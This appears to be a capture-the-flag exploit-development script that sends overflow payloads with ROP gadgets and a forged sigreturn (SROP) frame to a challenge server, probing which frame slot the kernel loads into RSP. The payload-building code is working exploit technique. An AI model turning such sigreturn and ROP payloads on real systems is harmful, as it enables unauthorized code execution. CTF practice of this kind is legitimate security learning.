#!/usr/bin/env python3
"""Three one-variable probes for where rt_sigreturn takes RSP.

The frame sits at buf+0x90 and f1's `write(1, rsp, 8)` reads whatever rsp points
at, so a landmark placed at a known offset identifies the loaded value the moment
the kernel honours it.

  P1 control          : nothing extra written              -> expect 00*8
  P2 frame+0x00        = &landmark                          -> landmark  => rsp stayed at the frame base
  P3 sigcontext+0x78   = &landmark (the documented rsp slot) -> landmark  => normal sigreturn
"""
import socket
import struct
import time

HOST = "chal.sunshinectf.games"
PORT = 26003
G1, SC, LEAK = 0x401032, 0x401069, 0x401017
FRAME_AT, B = 0x90, 0x28
FRAME_LEN = B + 0xC0
OFF_LAND = 0x180                  # just past the frame, keeps the payload compact
LAND = 0xC0FFEE11223344


def recvn(s, n, t=4.0):
    s.settimeout(t)
    b = b""
    while len(b) < n:
        try:
            c = s.recv(n - len(b))
        except socket.timeout:
            break
        if not c:
            break
        b += c
    return b


def drain(s, t=2.0):
    s.settimeout(t)
    b = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            b += c
    except socket.timeout:
        pass
    return b


def go(name, frame_writes):
    s = socket.create_connection((HOST, PORT), timeout=20)
    try:
        L = struct.unpack("<Q", recvn(s, 8))[0]
        buf = L - 0x78
        f = bytearray(FRAME_LEN)
        struct.pack_into("<Q", f, B + 0x80, LEAK)          # rip
        struct.pack_into("<Q", f, B + 0x88, 0x246)         # eflags
        struct.pack_into("<Q", f, B + 0x90, 0x33 | (0x2B << 48))
        for off, val in frame_writes(buf):
            struct.pack_into("<Q", f, off, val)
        body = bytearray(b"\x90" * (OFF_LAND + 8))
        struct.pack_into("<Q", body, 0x80, G1)
        struct.pack_into("<Q", body, 0x88, SC)
        struct.pack_into("<Q", body, OFF_LAND, LAND)
        body[FRAME_AT:FRAME_AT + FRAME_LEN] = f
        assert body[OFF_LAND:OFF_LAND + 8] == struct.pack("<Q", LAND)
        s.sendall(b"\x90" * 24 + bytes(body))
        time.sleep(0.5)
        pre = drain(s, 0.3)
        s.sendall(b"Z" * 15)
        time.sleep(0.5)
        got = pre + drain(s, 2.5)
        v = struct.unpack("<Q", got[:8])[0] if len(got) >= 8 else None
        verdict = {0: "zeros", LAND: "LANDMARK (slot loaded INTO rsp)",
                   buf + OFF_LAND: "echo of the pointer (rsp = frame base, untouched)"
                   }.get(v, "other")
        print("%-22s n=%-3d raw=%-16s val=%-20s -> %s" % (
            name, len(got), got[:8].hex(), hex(v) if v is not None else "-", verdict))
    finally:
        s.close()
    time.sleep(0.6)


go("P1 control", lambda buf: [])
go("P2 frame+0x00", lambda buf: [(0x00, buf + OFF_LAND)])
go("P3 sc+0x78", lambda buf: [(B + 0x78, buf + OFF_LAND)])
